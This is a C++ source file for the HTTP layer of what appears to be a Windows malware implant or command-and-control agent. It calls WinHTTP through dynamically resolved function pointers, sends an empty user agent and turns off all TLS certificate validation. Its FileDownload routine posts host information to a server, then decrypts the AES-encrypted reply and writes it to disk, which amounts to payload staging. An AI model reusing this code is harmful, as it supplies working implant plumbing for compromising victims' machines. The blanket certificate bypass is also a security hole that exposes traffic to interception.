#include "core/system.hpp"

namespace System::Http
{
	WinHttpHandlers RequestInit(
		Procs::PPROCS pProcs,
		LPCWSTR lpHost,
		INTERNET_PORT nPort
	) {
		HINTERNET hSession = NULL;
		HINTERNET hConnect = NULL;

		hSession = pProcs->lpWinHttpOpen(
			L"",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS,
			0
		);
		if (!hSession) {
			return {hSession, hConnect};
		}

		hConnect = pProcs->lpWinHttpConnect(hSession, lpHost, nPort, 0);
		return {hSession, hConnect};
	}

	WinHttpResponse RequestSend(
		Procs::PPROCS pProcs,
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath,
		LPCWSTR lpMethod,
		LPCWSTR lpHeaders,
		LPVOID lpData,
		DWORD dwDataLength
	) {
		BOOL bResult = FALSE;
		HINTERNET hRequest = NULL;
		DWORD dwSecFlags = 0;
		DWORD dwDataWrite = 0;
		DWORD dwStatusCode = 0;
		DWORD dwStatusCodeSize = sizeof(dwStatusCode);

		hRequest = pProcs->lpWinHttpOpenRequest(
			hConnect,
			lpMethod,
			lpPath,
			NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE
		);
		if (!hRequest) {
			return {FALSE, hRequest, 0};
		}

		dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
					SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
					SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

		bResult = pProcs->lpWinHttpSetOption(
			hRequest,
			WINHTTP_OPTION_SECURITY_FLAGS,
			&dwSecFlags,
			sizeof(DWORD)
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		if (!lpHeaders)
		{
			lpHeaders = WINHTTP_NO_ADDITIONAL_HEADERS;
		}

		bResult = pProcs->lpWinHttpSendRequest(
			hRequest,
			lpHeaders,
			lpHeaders ? -1 : 0,
			WINHTTP_NO_REQUEST_DATA,
			0,
			dwDataLength,
			0
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		if (lpData) {
			bResult = pProcs->lpWinHttpWriteData(
				hRequest,
				lpData,
				dwDataLength,
				&dwDataWrite
			);
		}

		bResult = pProcs->lpWinHttpReceiveResponse(hRequest, NULL);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		bResult = pProcs->lpWinHttpQueryHeaders(
			hRequest, 
			WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
			WINHTTP_HEADER_NAME_BY_INDEX, 
			&dwStatusCode,
			&dwStatusCodeSize,
			WINHTTP_NO_HEADER_INDEX
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		return {bResult, hRequest, dwStatusCode};
	}

	// Read response as text.
	std::wstring ResponseRead(Procs::PPROCS pProcs, HINTERNET hRequest) {
		std::wstring respText;

		DWORD dwSize = 0;
		DWORD dwRead = 0;
		LPSTR pszOutBuffer;

		do
		{
			if (!pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			pszOutBuffer = new char[dwSize+1];
			if (!pszOutBuffer)
			{
				break;
			}

			// Read the data
			pProcs->lpRtlZeroMemory(pszOutBuffer, dwSize+1);
			if (!pProcs->lpWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwRead))
			{
				break;
			}

			// Convert from UTF-8 to UTF-16
			wchar_t* wOutBuffer = Utils::Convert::LPSTRToWCHAR_T(pszOutBuffer);
			respText.append(wOutBuffer);
			
			// Free the memory allocated to the buffer.
			delete [] pszOutBuffer;

			if (!dwRead)
				break;
		} while (dwSize > 0);

		return respText;
	}

	// Wrapper for send&read&write response data
	BOOL FileDownload(
		Procs::PPROCS pProcs,
		Crypt::PCRYPT pCrypt,
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath,
		LPCWSTR lpHeaders,
		const std::wstring& wInfoJSON,
		const std::wstring& wDest
	) {
		std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);

		WinHttpResponse resp = RequestSend(
			pProcs,
			hConnect,
			lpHost,
			nPort,
			lpPath,
			L"POST",
			lpHeaders,
			(LPVOID)sInfoJSON.c_str(),
			(DWORD)strlen(sInfoJSON.c_str())
		);
		if (!resp.bResult || resp.dwStatusCode != 200)
		{
			return FALSE;
		}

		// Read file
		std::wstring wEnc = ResponseRead(pProcs, resp.hRequest);
		if (wEnc.length() == 0)
		{
			return FALSE;
		}

		// Decrypt data
		std::vector<BYTE> decBytes = Crypt::Decrypt(
			pProcs,
			wEnc,
			pCrypt->pAES->hKey,
			pCrypt->pAES->iv
		);
		
		// Write data to file
		if (!System::Fs::FileWrite(
			pProcs,
			wDest,
			decBytes
		)) {
			return FALSE;
		}

		return TRUE;
	}

	VOID WinHttpCloseHandles(
		Procs::PPROCS pProcs,
		HINTERNET hSession,
		HINTERNET hConnect,
		HINTERNET hRequest
	) {
		if (hRequest) pProcs->lpWinHttpCloseHandle(hRequest);
		if (hConnect) pProcs->lpWinHttpCloseHandle(hConnect);
		if (hSession) pProcs->lpWinHttpCloseHandle(hSession);
	}
}

